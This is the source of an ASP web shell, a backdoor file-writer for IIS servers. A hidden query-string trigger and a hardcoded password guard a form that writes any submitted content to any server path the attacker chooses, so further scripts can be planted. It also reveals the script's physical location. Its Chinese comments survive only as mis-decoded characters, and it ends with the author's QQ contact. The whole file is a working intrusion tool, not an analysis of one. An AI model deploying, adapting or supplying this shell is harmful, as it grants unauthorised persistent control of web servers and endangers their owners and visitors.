Const Password="wenshaoiloveyou"     '�����������

Const bl="hello"                '�������

const m="world"                 '�������ֵ,����xxx.asp?hello=world

'�������

Sub Echo(sStr)

  Response.Write sStr

End Sub

'��½�ж�

Sub PageLogin()

  dim pwd,theAct

  pwd=request.Form("pwd")

  theAct=request.Form("theAct")

       If theAct ="Login" Then

       If Password = pwd Then

    Session(m &amp; "Password") = Password

    write()

    Exit Sub

       End If

  end if

  If Session(m &amp; "Password") = Password Then

    write()

   Exit Sub

  End If

  Echo "&lt;form method=post name=formx action=''&gt;"

  Echo "&lt;input type=hidden name=theAct value=Login&gt;"

  Echo "&lt;input name=pwd type=password style='border:1px solid #d8d8f0;background-color:#ffffff;'&gt; "

  Echo "&lt;input type=submit value='login' style='border:1px solid #d8d8f0;background-color:#f9f9fd;'&gt;"

  Echo "&lt;/form&gt;"

End Sub

'��½��д����,תcyfdд��

sub write()

dim objFSO

dim fdata

dim objCountFile

on error resume next

Set objFSO = Server.CreateObject("Scripting.FileSystemObject")

if Trim(request("syfdpath"))&lt;&gt;"" then

fdata = request("cyfddata")

Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)

objCountFile.Write fdata

if err =0 then

Echo "����ɹ�"

else

Echo "����ʧ��"

end if

err.clear

end if

objCountFile.Close

Set objCountFile=Nothing

Set objFSO = Nothing

Echo "&lt;form action='' method=post&gt;"

Echo "�����ļ���&lt;font color=red&gt;����·��(�����ļ���:��D:\web\x.asp):&lt;/font&gt;"

Echo "&lt;input type=text name=syfdpath width=32 size=50&gt;"

Echo "&lt;br&gt;"

Echo "���ļ�����·��"

%&gt;

&lt;%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%&gt;

&lt;%

Echo "&lt;br&gt;"

Echo "�����������:"

Echo "&lt;textarea name=cyfddata cols=80 rows=10 width=32&gt;&lt;/textarea&gt;"

Echo "&lt;input type=submit value=����&gt;"

Echo "&lt;/form&gt;"

end sub

If Request.QueryString(bl)=m then '�жϽ����Ƿ���xxx.asp?hello=world������ʽ

PageLogin()

else

end if

%&gt;
-----------------------------------------------------------------------------------
by:��������QQ��437862467